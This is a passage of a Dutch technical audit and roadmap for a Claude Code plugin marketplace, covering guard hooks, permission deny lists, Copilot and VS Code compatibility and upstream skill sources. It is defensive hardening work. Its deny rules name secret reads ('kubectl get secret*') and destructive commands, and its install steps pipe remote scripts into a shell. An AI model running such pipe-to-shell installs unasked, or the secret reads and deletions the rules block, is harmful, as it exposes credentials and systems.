| `AGENTS.md` / `CLAUDE.md` in de repo | features-6, docs-13 | `AGENTS.md` met: "Bewerk nooit `plugins/<vendored>` (sync.sh `rsync --delete`). Repo-owned: component-documentation, spec-kit, `plugins/*/.claude-plugin/plugin.json` voor bare-skill-bronnen. Genereer SKILLS.md altijd via `python3 scripts/gen-catalog.py`. Validatie: `python3 scripts/validate.py` (Python ≥3.10). Een nieuwe bron gaat via drie PR's (landscape-v1)." |
| User-memory + path-scoped rules | features-7, landscape-15 | `~/.claude/CLAUDE.md` met cloud-conventies (`set -euo pipefail`, kubectl read-only by default, nooit `terraform apply` zonder vraag). Daarnaast `~/.claude/rules/helm.md` met `paths: ["**/charts/**","**/values*.yaml"]`. Kanttekening: VS Code Local leest `~/.claude/rules` **niet**, alleen de Agent Host doet dat (gecorrigeerd). |
| PreToolUse-guardrails | features-2, features-v3, features-v1 | `hooks/hooks.json`: `{"hooks":{"PreToolUse":[{"matcher":"Bash\|PowerShell","hooks":[{"type":"command","command":"sh \"${CLAUDE_PLUGIN_ROOT}/scripts/guard.sh\""}]}]}}`. `guard.sh` tokenizeert en geeft `deny` op `terraform destroy` en op `kubectl … delete` bij een prod-context, en `ask` op `apply` en `helm upgrade`. Bij twijfel faalt hij dicht. |
| PostToolUse-linters | features-3 | Matcher `Write\|Edit` start `lint-on-edit.sh`: shellcheck en shfmt voor `.sh`, ruff voor `.py`, yamllint voor `.yaml`, `helm lint`, `terraform fmt -check`. Output gaat via `additionalContext` en blijft onder 10K chars. Ontbrekende tools worden overgeslagen. |
| ask/deny, autoMode, sandbox, env, attribution | features-4, docs-v1 | `settings/guardrails-cloud.json`: `"deny":["Bash(kubectl get secret*)","PowerShell(kubectl get secret*)"]`, `"ask":["Bash(terraform apply *)","Bash(helm upgrade *)"]`, `"sandbox":{"filesystem":{"allowWrite":["~/.kube"]}}` (Linux/WSL2), `"env":{"AZURE_MCP_COLLECT_TELEMETRY":"false"}`. Leg in `$comment` uit dat dit best-effort is. |
| Statusline | features-5 | `"statusLine":{"type":"command","command":"~/.claude/statusline.sh"}` toont `⎈ aks-prod-weu/payments \| az: sub-platform-prod \| ctx 37%` en kleurt rood bij prod. Het prototype draaide in 0,022 s. Een plugin kan geen statusline leveren, dus die moet via het installer of een template. |
| Subagents | features-8 | `k8s-troubleshooter`, `helm-chart-reviewer`, `iac-reviewer`. Read-only afdwingen gaat via de guard-hook op `agent_type`, **niet** via `tools`/`disallowedTools` (gecorrigeerd). |
| Project-settings voor cloud-sessies | features-9 | `.claude/settings.json` met een SessionStart-hook: `[ "$CLAUDE_CODE_REMOTE" = true ] \|\| exit 0; sudo apt-get install -y rsync shellcheck`. Het cloud-setup-script heeft de voorkeur (cached). |
| Headless Claude-review / claude-code-action | features-10 | Een aparte job: `claude --bare -p "review this sync diff for injection" --tools "Read,Grep,Glob" --permission-mode dontAsk --max-turns 15 --output-format json --json-schema schema.json`, met `ANTHROPIC_API_KEY` alleen in die stap. |
| Native marketplace-`autoUpdate` | install-update-5 | `jq '.extraKnownMarketplaces["my-claude-skills"].autoUpdate=true' ~/.claude/settings.json` |
| `defaultEnabled`, `dependencies`-bundles, `forceRemoveDeletedPlugins`, `renames` | features-11, portfolio-3, spec-7 | In `marketplace.json`: `"forceRemoveDeletedPlugins": true`, en per opt-in-entry `"defaultEnabled": false`. |
| MCP-servers | features-13, landscape-9, landscape-12 | Microsoft Learn (HTTP, zonder dependencies), kubernetes-mcp-server met TOML `read_only = true` en een viewer-kubeconfig, context7 en github (remote HTTP, ook portable naar Copilot). Azure MCP alleen gepind (`@azure/mcp@2.0.5`) en zonder telemetry-hooks. |
| Repo-skills voor onderhoud | features-14 | `.claude/skills/add-upstream-source/SKILL.md` (met `disable-model-invocation: true`) automatiseert de vier stappen uit de README. Verder `review-sync-pr` met `` !`gh pr diff` ``. |
| Output-style | features-15 | `{"outputStyle":"Concise"}` als alternatief voor caveman: geen node-hooks, geen injectie per prompt. |
| Listing-budget | features-v2, portfolio-v1 | `{"skillListingBudgetFraction":0.03}`. Gebruik `/context` om het effect te meten. |
| Plugin-validatie per plugin | sync-ci-10 | `for d in plugins/*/; do claude plugin validate "$d"; done` in CI |

## 6. VS Code + GitHub Copilot

**Kernpunt:** de bestaande marketplace werkt zonder conversie. Copilot CLI 1.0.88 installeerde alle 23 plugins, inclusief caveman met url+sha. VS Code ≥1.110 leest `.claude-plugin/marketplace.json` direct. Wat ontbreekt is operationeel: installers, updater en documentatie kennen alleen `claude` (install-update-21, copilot-cli-2 [high], copilot-vscode-1 [high], docs-8). Plugins die via Claude Code in `~/.claude/plugins` staan, ziet VS Code alleen in het "Claude"-session-target, niet in het Local- of Copilot-target. Copilot CLI leest `~/.claude` sinds 1.0.36 niet meer.

**Compatibiliteitsmatrix**

| Component | Claude Code | VS Code Copilot | Copilot CLI |
|---|---|---|---|
| Skills | Native | Native (GA sinds 1.109). Bij name≠folder laadt de skill onder de mapnaam, met een warning | Native. Listingbudget 15.000 chars (`SKILL_CHAR_BUDGET`) |
| Agents | Volledige frontmatter | Laadt ze; alleen name, description, tools en disallowedTools worden gebruikt | Laadt ze met tool-aliassen. `silent-failure-hunter` faalt op de YAML |
| Commands | `$ARGUMENTS`, `` !`cmd` ``, `${CLAUDE_PLUGIN_ROOT}` | Laadt ze als slash-commands, maar zonder substitutie | Laadt ze als skills, zonder substitutie (#4088) |
| Hooks | Alle events | Preview. Onbekende events (`UserPromptExpansion`, `PostToolUseFailure`) vallen weg, `matcher`, `if` en `async` worden genegeerd, timeout 30 s | PascalCase werkt; geen `if`/`asyncRewake` |
| MCP | Native | Laadt en wordt impliciet vertrouwd (geen prompt). Het Copilot-target accepteert alleen lokale servers | Native |
| LSP | Native | Geen plugin-component (gebruik Pylance of de C#-extensie) | Via `lsp.json` met `fileExtensions`. Pyright wordt geweigerd tot die fix er is |
| Instructions | CLAUDE.md, AGENTS.md (≥2.1.277, zonder CLAUDE.md), rules | Copilot-target: AGENTS.md en `copilot-instructions.md`. Claude-target: CLAUDE.md en rules. Local: alles | Mergt CLAUDE.md, AGENTS.md en `copilot-instructions.md` |
| Workflows (`.js`) | Native | Nee | Nee |
| Permissions | `settings/permissions*.json` | `chat.tools.terminal.autoApprove` (regex, met een standaard-denylist) | `--allow-tool 'shell(git status:*)'`. Skill-`allowed-tools` gelden voor de hele sessie |

**Portabiliteit per plugin**

| Plugin | Status | Wat breekt of degradeert | ID |
|---|---|---|---|
| dotnet-aspnetcore, dotnet-data, dotnet-nuget, dotnet-advanced, dotnet-test, azure-agent-skills, powershell, component-documentation, mattpocock-skills, terraform | as-is | azure: Learn-MCP ontbreekt (fallback werkt); terraform: docker en `TFE_TOKEN` | copilot-vscode-14 |
| codebase-onboarding | as-is, maar met een **security-risico** | de grant `python3/pip/git` geldt de hele sessie → niet in de default | critic-5, copilot-cli-v2 |
| anthropic-skills | mostly | de eval-loop van skill-creator roept `claude -p` aan | – |
| feature-dev | mostly | `$ARGUMENTS` in `/feature-dev` | copilot-cli-6 |
| dotnet | mostly | LSP alleen in de CLI; onschuldige warning | copilot-cli-16 |
| csharp-patterns | mostly | 6 name/folder-mismatches, `invocable` wordt genegeerd | copilot-vscode-3, copilot-cli-9 |
| spec-kit | mostly | alleen de tekst (check van `.claude/skills`) | copilot-cli-14 |
| agent-browser | mostly | `hidden` wordt genegeerd; de grant geldt de hele sessie | copilot-vscode-16 |
| pr-review-toolkit | partial | `$ARGUMENTS`; ongeldige YAML in `silent-failure-hunter`; `Bash`-grant voor de hele sessie | copilot-cli-11, copilot-cli-v2 |
| code-modernization | partial | `$1/$2` in 10 commands; 6 workflows | copilot-cli-6 |
| caveman | partial | POSIX-only hooks, geen Windows-override; `caveman-compress` → `claude --print` | copilot-vscode-8, copilot-cli-13 |
| pyright-lsp | claude-only in VS Code, cli-only na de fix | `extensionToLanguage` in plaats van `fileExtensions` | copilot-cli-1, copilot-vscode-v1, copilot-vscode-10 |
| commit-commands | claude-only | `` !`git status` `` plus "Do not use any other tools", dus in Copilot commit hij blind | copilot-cli-4, copilot-vscode-4 |
| claude-security | claude-only | Workflow-engine, `` !`cmd` ``, `${CLAUDE_SKILL_DIR}`, `UserPromptExpansion`. `/security-review` in Copilot bekijkt alleen diffs en is dus **geen** vervanging (gecorrigeerd) | copilot-cli-5, copilot-vscode-8 |

Overige compat-bevindingen: copilot-vscode-9 (low). Agents werken in Copilot-sessies met genegeerde velden. De claim dat `github.copilot.chat.cli.customAgents.enabled` agents tegenhoudt is weerlegd: die setting wordt in 1.137–1.139 niet aangeboden.

**Aanbevolen aanpak.** Laat Claude Code de bron van waarheid blijven en gebruik **Copilot CLI als install-engine**. VS Code ontdekt plugins automatisch in `~/.copilot/installed-plugins`, dus één installatie dient zowel Copilot CLI als VS Code. Claude-only plugins lopen via het Claude-session-target van VS Code (`chat.agentHost.claudeAgent.enabled`, standaard aan), dat `~/.claude` gebruikt. Verworpen alternatieven: skills kopiëren of symlinken, alleen de VS Code-UI gebruiken, een tweede `.github/plugin/marketplace.json` (copilot-cli-15, alleen als laatste optie), conversie naar het Agent Plugins 1.0-formaat, en alleen het Claude-target.

**Implementatiestappen in de repo**
1. **`profiles.json`** (zie §4). Neem critic-5 mee: codebase-onboarding **niet** in `copilotDefault`. Laat `validate.py` checken dat elke plugin in precies één profiel zit.
2. **`install-copilot.sh`** (±90 regels, `set -euo pipefail`):
   - `has copilot || npm install -g @github/copilot`, en check versie ≥1.0.70 (nodig voor de sha-pin).
   - `copilot plugin marketplace add lucas4790/my-claude-skills`, of `update` als hij al bestaat.
   - `copilot plugin install "$p@my-claude-skills"` per plugin in het profiel; weiger claude-only plugins tenzij `--force`.
   - `jq '.extraKnownMarketplaces["my-claude-skills"].autoUpdate=true'` op `~/.copilot/settings.json`.
   - Schrijf het gekozen profiel naar `~/.copilot/my-claude-skills.profile`.
   - Print de VS Code-snippet. Registreer **geen** hook.
3. **`install-copilot.ps1`**: spiegel van stap 2. Gebruik `ConvertFrom-Json`/`ConvertTo-Json -Depth 20`, laat de JSONC van VS Code ongemoeid (alleen printen) en sla caveman over op Windows. Neem de lessen uit install-update-8, -9 en -11 mee.
4. **Copilot-tak in `update-plugins.{sh,ps1}`**: `copilot plugin marketplace update my-claude-skills; copilot plugin update --all`. Neem de install-loop níet over (copilot-vscode-2). Voeg `"timeout": 60` toe aan de Claude-hook (copilot-vscode-13).
5. **`settings/vscode-settings.jsonc`**:
   ```jsonc
   {
     "chat.plugins.enabled": true,            // docs-tabel: default false; controleer altijd dat hij aan staat
     "chat.plugins.marketplaces": ["github/awesome-copilot#marketplace", "lucas4790/my-claude-skills"], // via "Add Item", default niet overschrijven
     "extensions.autoUpdate": true,
     "chat.useAgentsMdFile": true,
     "chat.useClaudeMdFile": true,
     "chat.useClaudeHooks": false,
     "chat.agentHost.claudeAgent.enabled": true
   }
   ```
   Optioneel komt daar een `chat.tools.terminal.autoApprove`-blok bij, afgeleid van het **gecorrigeerde** read-only-subset (copilot-vscode-12). Neem niets over van `git fetch *`, `jq *` of `terraform plan *`.
6. **`AGENTS.md`**: zie §5.
7. **`settings/user-instructions.md`**: het cloud-engineer-profiel, om toe te voegen (append, geen symlink) aan `~/.copilot/copilot-instructions.md` en `~/.claude/CLAUDE.md` (copilot-vscode-5, features-7).
8. **`settings/project-plugins.json`**: `{"extraKnownMarketplaces":{"my-claude-skills":{"source":{"source":"github","repo":"lucas4790/my-claude-skills"}}},"enabledPlugins":{"terraform@my-claude-skills":true,"azure-agent-skills@my-claude-skills":true}}`. Kopieer naar `<repo>/.github/copilot/settings.json` (Copilot CLI en de cloud-agent) en naar `.claude/settings.json`, en houd ze identiek (copilot-vscode-6, copilot-cli-7).
9. **`plugins/pyright-lsp/lsp.json`** (repo-owned, overleeft de sync): `{"lspServers":{"pyright":{"command":"pyright-langserver","args":["--stdio"],"fileExtensions":{".py":"python",".pyi":"python"}}}}` (copilot-cli-1).
10. **Checks in `validate.py`** (copilot-cli-10, copilot-vscode-11):
    - name gelijk aan de map, maximaal 64 tekens, description maximaal 1024
    - `url` eindigt op `.git`
    - LSP-config heeft `fileExtensions`
    - agent-YAML parseert
    - brede `allowed-tools`, en voor `copilotDefault` een fail (critic-5)
    - lidmaatschap van profielen
    - budget van `copilotDefault` onder 15.000 chars
11. **Kolom "Copilot" in SKILLS.md** via `gen-catalog.py`: yes, CLI-only of Claude-only.
12. **README en SECURITY**: de drie routes, de profieltabel, de settings-snippet en troubleshooting voor de policies (copilot-vscode-15). Vermeld dat MCP-servers impliciet vertrouwd worden en dat allowed-tools in Copilot de hele sessie gelden. Voeg de Remote-WSL-notitie toe (critic-4).

**Stap voor stap in VS Code**

*Vereisten:* VS Code **≥1.126** als je Remote-WSL of SSH gebruikt (critic-4; eerder konden skill-bestanden niet gelezen worden). Native Windows werkt vanaf ≥1.110; de huidige stable is 1.139. Verder: de GitHub Copilot Chat-extensie (ingelogd), Node.js/npm en git.

*Windows (native VS Code, en ook VS Code met Remote-WSL):*
1. Draai in PowerShell `irm https://raw.githubusercontent.com/lucas4790/my-claude-skills/main/install-copilot.ps1 | iex` (standaard het cloud-profiel). Een ander profiel kies je met `& ([scriptblock]::Create((irm …/install-copilot.ps1))) -Profile core,dotnet`. De plugins komen in `%USERPROFILE%\.copilot\installed-plugins`.
2. **Remote-WSL:** VS Code gebruikt ook bij een WSL-verbinding de plugins aan de **Windows-kant** (`environmentService.cacheHome`, microsoft/vscode#305168). Installeer daarom via de `.ps1` op Windows of via de VS Code-UI. Hooks en MCP-commando's (`sh`, `node`, `docker`) moeten beschikbaar zijn waar de Agent Host draait. Test dit één keer echt voordat je erop vertrouwt.

*Linux of WSL (Copilot CLI in de terminal):*
1. Draai `curl -fsSL https://raw.githubusercontent.com/lucas4790/my-claude-skills/main/install-copilot.sh | bash`, of `bash install-copilot.sh --profile core,dotnet`. Binnen WSL is dit alleen voor Copilot CLI; voor VS Code op Windows, zie hierboven.

*In VS Code (beide):*
1. Open Settings (`Ctrl+,`), zoek `chat.plugins.enabled` en zorg dat hij aangevinkt is. Is hij grijs, dan beheert org-policy hem.
2. Zoek `chat.plugins.marketplaces`, klik **Add Item** en vul `lucas4790/my-claude-skills` in. Vervang de default-entries niet.
3. Kies *Developer: Reload Window* en ga daarna naar het Extensions-view met `@agentPlugins` (of *Chat: Open Customizations > Plugins*). Accepteer de trust-prompt.
4. Schakel per workspace alleen in wat je nodig hebt (contextmenu van de plugin), zodat de skill-context klein blijft.
5. Zet `extensions.autoUpdate` op true: plugins worden dan elke 24 uur bijgewerkt.
6. Instructions: voeg `settings/user-instructions.md` toe aan `~/.copilot/copilot-instructions.md` (Windows: `%USERPROFILE%\.copilot\…`) en aan `~/.claude/CLAUDE.md`. Per project gebruik je `AGENTS.md`.
7. Per project kopieer je `settings/project-plugins.json` naar `<repo>/.github/copilot/settings.json`.
8. Controleer het resultaat: typ `/` in Chat en kijk of `/terraform:…` en de azure-skills verschijnen. In de CLI: `copilot plugin list`, `copilot skill list` en `copilot mcp list` (terraform heeft Docker en `TFE_TOKEN` nodig).
9. Voor claude-only plugins (claude-security, commit-commands, code-modernization, pr-review-toolkit) kies je het **Claude**-session-target in de agent-picker.
10. Draai in Copilot CLI na `/review-pr`, codebase-onboarding of agent-browser altijd `/reset-allowed-tools`.

**Risico's**
- Agent plugins en marketplaces zijn *Experimental*, hooks zijn *Preview*. Setting-IDs verschuiven (`github.copilot.chat.claudeAgent.enabled` werd `chat.agentHost.claudeAgent.enabled`), en de default van `chat.plugins.marketplaces` veranderde in 1.139. Hard-code die array daarom nooit.
- Org-policies kunnen alles stil blokkeren (copilot-vscode-15).
- Het budget van 15.000 chars in Copilot CLI raakt al vol met alleen de .NET- of alleen de Azure-groep (copilot-cli-3). Gebruik profielen en `SKILL_CHAR_BUDGET`.
- Security: `allowed-tools` gelden de hele sessie en plugin-MCP wordt impliciet vertrouwd (terraform krijgt `TFE_TOKEN`).
- Splitsing tussen WSL en Windows: `~/.copilot` in WSL is een andere map dan `%USERPROFILE%\.copilot`, dus je onderhoudt twee installaties (critic-4).
- Upstream-drift: de root-`plugin.json` van de dotnet-plugins wint in Copilot. Een toegevoegd `$schema` zou de layout veranderen, dus voeg een pariteitscheck toe.
- VS Code-updates hangen af van `extensions.autoUpdate`. Copilot CLI-autoUpdate draait niet in VS Code SDK-sessies, dus de Copilot-tak in update-plugins blijft nodig.
- Niet getest: VS Code zelf, Remote-WSL, en de Copilot coding agent (cloud) met `copilot-setup-steps.yml` en de firewall.

## 7. Aanbevolen upstream-bronnen

**Randvoorwaarde (critic):** voeg nieuwe plugins pas toe nadat de updater gefixt is (install-update-1, security-v4) en nieuwe entries `defaultEnabled:false` krijgen (portfolio-3, portfolio-v3). Anders wordt elke toevoeging binnen 6 uur op elke machine geïnstalleerd. Onboard in drie PR's volgens landscape-v1, en meet de listing opnieuw na elke toevoeging (landscape-v2).

**Fase 1**

| # | Bron | URL | Trust | Gap | ID |
|---|---|---|---|---|---|
| 1 | Microsoft Learn MCP (`microsoft-docs`) | https://github.com/MicrosoftDocs/mcp | high | MCP-afhankelijkheid van azure-skills | landscape-1 |
| 2 | HashiCorp Terraform-skills (zonder provider-dev) | https://github.com/hashicorp/agent-skills | high | Terraform-authoring en -testing | landscape-5 |
| 3 | Docker skills @ `v0.3.0` | https://github.com/docker/skills | high | Dockerfile en Compose | landscape-6 |
| 4 | Astral uv/ruff/ty (alleen de skills, **niet** de `ty@latest`-LSP) | https://github.com/astral-sh/claude-code-plugins | high | Python-tooling | landscape-4 |
| 5 | KubeShark | https://github.com/LukasNiessen/kubernetes-skill | low | K8s, Helm, kustomize | landscape-2 |
| 6 | wshobson shell-scripting | https://github.com/wshobson/agents/tree/main/plugins/shell-scripting | low | bash, shellcheck, bats | landscape-3 |

**Fase 2 (opt-in)**

| # | Bron | URL | Trust | Gap | ID |
|---|---|---|---|---|---|
| 7 | Grafana-skills (subset) | https://github.com/grafana/skills | high | PromQL, Loki, Tempo, Alloy, OTel | landscape-7 |
| 8 | microsoft/azure-skills (alleen skills, `@azure/mcp@2.0.5` gepind, geen hooks) | https://github.com/microsoft/azure-skills | high | Azure-uitvoering (diagnostics, validate) | landscape-10 |
| 9 | kubernetes-mcp-server (repo-owned wrapper, `read_only = true`) | https://github.com/containers/kubernetes-mcp-server | low | Live cluster, read-only | landscape-9 |
| 10 | claude-plugins-official extra's: context7, github, hookify, plugin-dev | https://github.com/anthropics/claude-plugins-official | high (bestaande bron) | Docs-lookup, GitHub en plugin-ontwikkeling | landscape-12 |
| 11 | MicrosoftDocs/agent-skills: services die je echt gebruikt (Container Apps, Resource Graph, Key Vault…) | https://github.com/MicrosoftDocs/agent-skills | high (bestaande bron) | Azure-dekking | landscape-13 |
| 12 | awesome-copilot: skills (Actions-hardening, postmortem…) | https://github.com/github/awesome-copilot | low | CI, incidenten | landscape-11 |
| 13 | awesome-copilot: `*.instructions.md` → `~/.claude/rules` met `paths:` | https://github.com/github/awesome-copilot/tree/main/instructions | low | Path-scoped regels voor beide tools | landscape-15 |
| 14 | foxj77 platform-skills | https://github.com/foxj77/claude-code-skills | low (7 maanden stil) | cert-manager, external-secrets, DNS | landscape-14 |
| 15 | fluxcd/agent-skills | https://github.com/fluxcd/agent-skills | high | GitOps, alleen als je Flux gebruikt | landscape-8 |

**`sources.json`-snippets (fase 1, geverifieerde copy-paden)**

```json
{"name":"microsoft-docs-mcp","repo":"https://github.com/MicrosoftDocs/mcp.git","ref":"main","trust":"high","copy":[
 {"from":".claude-plugin/plugin.json","to":"plugins/microsoft-docs/.claude-plugin/plugin.json"},
 {"from":".mcp.json","to":"plugins/microsoft-docs/.mcp.json"},
 {"from":"skills","to":"plugins/microsoft-docs/skills"},
 {"from":"LICENSE-CODE","to":"plugins/microsoft-docs/LICENSE"},
 {"from":"LICENSE","to":"plugins/microsoft-docs/LICENSE-DOCS"}]},
{"name":"hashicorp-agent-skills","repo":"https://github.com/hashicorp/agent-skills.git","ref":"main","trust":"high","copy":[
 {"from":"plugins/terraform/skills","to":"plugins/terraform-skills/skills","exclude":["new-terraform-provider","provider-actions","provider-configuration","provider-docs","provider-ephemeral-resources","provider-framework-migration","provider-resources","provider-test-patterns","run-acceptance-tests"]},
 {"from":"LICENSE","to":"plugins/terraform-skills/LICENSE"}]},
{"name":"docker-skills","repo":"https://github.com/docker/skills.git","ref":"v0.3.0","trust":"high","copy":[
 {"from":"skills/docker-project-foundations","to":"plugins/docker/skills/docker-project-foundations"},
 {"from":"skills/docker-build-strategies","to":"plugins/docker/skills/docker-build-strategies"},
 {"from":"skills/docker-compose-patterns","to":"plugins/docker/skills/docker-compose-patterns"},
 {"from":"skills/docker-destructive-guardrails","to":"plugins/docker/skills/docker-destructive-guardrails"},
 {"from":"LICENSE","to":"plugins/docker/LICENSE"}]},
{"name":"astral-skills","repo":"https://github.com/astral-sh/claude-code-plugins.git","ref":"main","trust":"high","copy":[
 {"from":"plugins/astral/skills","to":"plugins/astral/skills"},
 {"from":"LICENSE-MIT","to":"plugins/astral/LICENSE-MIT"},
 {"from":"LICENSE-APACHE","to":"plugins/astral/LICENSE-APACHE"}]},
{"name":"kubeshark","repo":"https://github.com/LukasNiessen/kubernetes-skill.git","ref":"main","trust":"low","copy":[
 {"from":"SKILL.md","to":"plugins/kubernetes/skills/kubernetes-skill/SKILL.md"},
 {"from":"references","to":"plugins/kubernetes/skills/kubernetes-skill/references"},
 {"from":"LICENSE","to":"plugins/kubernetes/LICENSE.kubeshark"}]},
{"name":"wshobson-agents","repo":"https://github.com/wshobson/agents.git","ref":"main","trust":"low","copy":[
 {"from":"plugins/shell-scripting","to":"plugins/shell-scripting","exclude":[".codex-plugin"]},
 {"from":"LICENSE","to":"plugins/shell-scripting/LICENSE"}]}
```

Aandachtspunten:
- Voor astral, kubeshark, terraform-skills en docker is een repo-owned `plugin.json` nodig, want je kopieert alleen skills. Bij astral voorkom je zo de tweede LSP naast pyright.
- In plaats van het microsoft-docs-plugin kun je ook de minimale inline `mcpServers` in `azure-agent-skills` gebruiken (zie §4).
- Verwachte scan-hits die onschuldig zijn: KubeShark `examples-bad.md:221`, terraform-test `CI_CD.md:44` en 3 in docker. Die komen via de sync-PR binnen (landscape-v1).

## 8. Roadmap

Stand van 2026-09-27. Wat sindsdien is opgelost, staat bij de rijen in §3 en §4 (zie de status bovenaan).

**Quick wins (< 1 uur)**
- Maak `permissions.json` echt read-only: haal `git fetch *`, de wildcards voor git log/diff/show en `jq *` weg, verplaats `terraform plan`/`validate` en `helm template` naar trusted, voeg een deny toe op `kubectl get secret*` en corrigeer `$comment` en README (security-v1, docs-2, critic-1, docs-v1).
- Voeg `.gitattributes` toe (critic-2).
- Vang de rc af in de sync-workflow (sync-ci-1).
- Voeg `--delete-excluded` toe (sync-ci-14).
- Pin checkout op v7.0.1 met `persist-credentials: false` en `permissions: {}` (sync-ci-19, sync-ci-9, deels sync-ci-7).
- Laat de ruleset `~DEFAULT_BRANCH` includen en voeg `pull_request`- en status-check-rules toe (critic-3).
- Zet `autoUpdate: true` en `forceRemoveDeletedPlugins: true` (install-update-5, spec-7, install-update-17).
- Zet `skillListingBudgetFraction` en documenteer het (features-v2, portfolio-v1).
- Voeg de repo-owned `pyright-lsp/lsp.json` toe (copilot-cli-1).
- Tekstfixes: docs-3, docs-15, docs-19, docs-18, sync-ci-13, sync-ci-17, sync-ci-18, sync-ci-20, sync-ci-v3.
- Overweeg `outputStyle: Concise` in plaats van caveman (features-15, portfolio-7).

**Korte termijn (1–2 dagen)**
1. **Updater en profielen:** alleen bestaande plugins updaten en nieuwe melden; lock en stamp na succes; hook naar de marketplace-clone; `profiles.json` + `defaultEnabled:false` met migratie; Azure opsplitsen; codebase-onboarding opt-in (install-update-1, docs-1, portfolio-2, security-v4, install-update-4, install-update-15, install-update-v2, install-update-19, portfolio-3, portfolio-v3, portfolio-12, portfolio-5, critic-5).
2. **Validator-hardening:** structurele hook- en MCP-diff, `--text` en difflib, symlinks weigeren, Unicode-normalisatie, caveman-bump-scan, per-plugin `claude plugin validate` (sync-ci-5, security-v2, features-12, sync-ci-v2, sync-ci-v1, sync-ci-4, sync-ci-6, security-v3, sync-ci-7, sync-ci-3, sync-ci-10, spec-6, sync-ci-15, spec-12).
3. **CI-model:** werk sync-ci-2 bij, voeg het onboarding-pad toe (landscape-v1) en pas `bump-pinned` aan (sync-ci-11).
4. **Versiebeheer:** `version` herschrijven in `sync.sh` en caveman herinstalleren bij een sha-mismatch (spec-1, spec-3, spec-13).
5. **Installer-bugs:** install-update-3, install-update-6, install-update-7, install-update-8, install-update-9, install-update-10, install-update-11, install-update-12, install-update-13, install-update-14, install-update-16, install-update-20, install-update-22, install-update-23, install-update-24, install-update-v1, install-update-2, docs-5.
6. **Learn-MCP inline in azure-agent-skills en pinnen** (landscape-1, features-1, portfolio-11, copilot-cli-8, copilot-vscode-14, security-v5).
7. **Templates:** trusted-repo voor jouw stack, ask/deny en guardrails, statusline (critic-6, features-4, features-v1, features-5).
8. **Documentatie:**
   - AGENTS.md (docs-13, features-6, copilot-cli-12, copilot-vscode-5)
   - install-, hook- en uninstall-docs (docs-4, docs-6, install-update-18, docs-7, docs-9, docs-10, docs-11, docs-12, docs-14, docs-16, docs-17, docs-20, docs-v2)
   - repo-owned skills (portfolio-qa-speckit-1, portfolio-qa-compdoc-1, -2, -3, copilot-cli-14)
   - portfolio-4, portfolio-v2, portfolio-v4, portfolio-6, portfolio-8, portfolio-9, portfolio-10
9. **Project-settings voor cloud-sessies** (features-9).

**Middellange termijn**
1. **VS Code en Copilot:**
   - `install-copilot.{sh,ps1}`, een Copilot-tak in de updater, de VS Code-snippet, user- en project-templates, compat-checks in `validate.py`, een SKILLS-kolom en de README- en SECURITY-sectie (install-update-21, copilot-cli-2, copilot-vscode-1, copilot-vscode-2, copilot-vscode-6, copilot-cli-7, copilot-vscode-12, copilot-vscode-13, copilot-cli-10, copilot-vscode-11, copilot-cli-v2, copilot-cli-3, copilot-vscode-7, docs-8, critic-4, copilot-vscode-15).
   - Accepteer degradatie voor copilot-vscode-4, copilot-vscode-8, copilot-vscode-9, copilot-vscode-10, copilot-cli-4, copilot-cli-5, copilot-cli-6.
   - Optioneel: copilot-cli-15.
2. **Overlay-mechanisme in `sync.sh`** (copilot-cli-v1), daarna:
   - spec-2, spec-4, spec-9, spec-10, spec-11
   - copilot-vscode-3, copilot-vscode-16, copilot-cli-9, copilot-cli-11
   - critic-7, portfolio-5 (alleen als overlay nodig is)
   - de rest van spec-14, spec-v1, copilot-cli-13 en copilot-cli-16 upstream melden
3. **Guardrail-plugin** met bats-tests, PostToolUse-linters en subagents (features-2, features-v3, features-v1, features-3, features-8).
4. **Nieuwe bronnen, gefaseerd** (landscape-2 t/m -15, landscape-v2), met de gaps: portfolio-gap-k8s, -helm, -bash, -yaml, -python, -terraform, -containers, -observability, -incident, -ci, -iac-security, -gitops.
5. **Claude-review van sync-PR's, MCP-aanbod en onderhoudsskills** (features-10, features-13, features-14, features-7, landscape-15).
6. **Hygiëne:** sync-ci-8, sync-ci-12, sync-ci-16, install-update-2 (alleen als macOS relevant blijft).

## 9. Bijlage

### 9.1 Weerlegde en gecorrigeerde claims

| Claim | Status | Waarom |
|---|---|---|
| `security-probe` | weerlegd | Placeholder zonder inhoud; de echte security-issues zijn security-v1 t/m v5 |
| "34 hook-events" (sync-ci-5) | gecorrigeerd | De hooks-doc heeft er 33; de conclusie (8 gedekt) verandert niet |
| caveman `ed37ab1..2fd153c` = 44 commits | gecorrigeerd | 51 commits (40 zonder merges); de diffstat klopt |
| Laatste `actions/checkout` = v6.1.0 | gecorrigeerd | v7.0.1 `3d3c42e5…` (node24, 2026-07-17) |
| Het warning-pad in `bump-pinned.sh:21` is dode code | weerlegd | Het vuurt bij een niet-bestaande ref; alleen netwerkfouten breken af |
| `skills` in `plugin.json` vervangt de default-scan | gecorrigeerd | Het vult hem aan; de conclusie voor mattpocock blijft staan |
| "De enige hefboom voor plugin-skills is de hele plugin aan of uit" | weerlegd | `skillListingBudgetFraction` werkt wel (0.04 gaf 49 van 53); `skillOverrides` niet |
| Dubbele agentnaam `code-reviewer` botst | weerlegd | De ID's zijn gescoped (`feature-dev:` en `pr-review-toolkit:`) |
| Dubbele descriptions door `anthropic-skills` | weerlegd | Alleen de overschaduwing klopt |
| mattpocock `wizard` claimt infra | weerlegd | De description is zelf-gescoped |
| Caveman Cloud is betaald; caveman heeft 21 skills | niet verifieerbaar / gecorrigeerd | Waitlist zonder prijzen; het zijn 20 skills + 1 command |
| 16 plugins zonder versie | gecorrigeerd | Het zijn er 15 (21 validate-warnings: 15 versie + 6 author) |
| `chat.plugins.enabled` standaard `true` (samenvatting van de mapping) | weerlegd (critic) | De AI-settings-reference noemt `false`. De broncode registreert wel `true`, dus altijd controleren dat hij aan staat |
| `github.copilot.chat.cli.customAgents.enabled` houdt plugin-agents tegen | weerlegd | De setting wordt in 1.137–1.139 niet aangeboden |
| Een name≠folder-skill faalt stil in VS Code | gecorrigeerd | Hij laadt onder de mapnaam met een warning |
| VS Code leest `~/.claude/rules` | gecorrigeerd | Alleen de Agent Host-harness; de Local-agent gebruikt profile-storage |
| `/security-review` in Copilot vervangt claude-security | weerlegd | Het bekijkt alleen diffs, geen volledige repo-audit |
| Read-only afdwingen via `tools`/`disallowedTools` in subagents | weerlegd | Daarvoor is een guard-hook op `agent_type` nodig |
| kubernetes-mcp-server accepteert geen `--read-only` meer | gecorrigeerd | Dat geldt alleen op main na #1423; v0.0.67 accepteert het nog. TOML `read_only` werkt in beide |
